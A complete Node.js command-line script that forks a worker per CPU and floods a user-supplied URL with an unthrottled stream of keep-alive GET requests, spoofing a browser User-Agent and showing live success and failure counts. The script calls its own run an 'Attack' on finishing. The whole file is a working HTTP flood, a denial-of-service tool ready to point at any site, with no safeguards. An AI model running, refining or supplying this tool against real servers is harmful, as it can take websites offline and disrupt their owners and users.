#!/usr/bin/env node
'use strict';
const cluster = require('cluster');
const os = require('os');
const http = require('http');
const https = require('https');
const { performance } = require('perf_hooks');
const chalk = require('chalk');

if (cluster.isMaster) {
    const args = process.argv.slice(2);
    if (args.length < 1) {
        console.log(`Usage: $0 <target_url> [threads] [duration]`);
        process.exit(1);
    }
    const target = args[0];
    const totalThreads = parseInt(args[1], 10) || os.cpus().length * 50;
    const duration = parseInt(args[2], 10) || 30;
    const workers = os.cpus().length;
    const threadsPerWorker = Math.ceil(totalThreads / workers);

    let total = 0, success = 0, failed = 0;
    const start = performance.now();

    for (let i = 0; i < workers; i++) cluster.fork();
    for (const id in cluster.workers) {
        cluster.workers[id].on('message', msg => {
            total += msg.total;
            success += msg.success;
            failed += msg.failed;
        });
    }

    setInterval(() => {
        const elapsed = ((performance.now() - start) / 1000).toFixed(2);
        process.stdout.write(
            `\r${chalk.greenBright('â–¶')} ${elapsed}s | Requests: ${total} | ` +
            `${chalk.green(success)} success | ${chalk.red(failed)} failed`
        );
    }, 100);

    for (const id in cluster.workers) {
        cluster.workers[id].send({ target, threadsPerWorker });
    }

    setTimeout(() => {
        for (const id in cluster.workers) cluster.workers[id].kill();
        console.log(`\n${chalk.blueBright('Attack finished')} in ${(performance.now() - start) / 1000}s`);
        process.exit(0);
    }, duration * 1000);

} else {
    process.on('message', ({ target, threadsPerWorker }) => {
        const url = new URL(target);
        const proto = url.protocol === 'https:' ? https : http;
        const agent = new proto.Agent({ keepAlive: true, maxSockets: threadsPerWorker });

        let total = 0, success = 0, failed = 0;

        function sendReq() {
            const req = proto.request({
                agent,
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname,
                method: 'GET',
                headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' }
            }, res => {
                res.on('data', () => {});
                res.on('end', () => { success++; total++; });
            });

            req.on('error', () => { failed++; total++; });
            req.setTimeout(2000, () => req.destroy());
            req.end();
            setImmediate(sendReq);
        }

        for (let i = 0; i < threadsPerWorker; i++) sendReq();
        setInterval(() => {
            process.send({ total, success, failed });
            total = success = failed = 0;
        }, 100);
    });
}
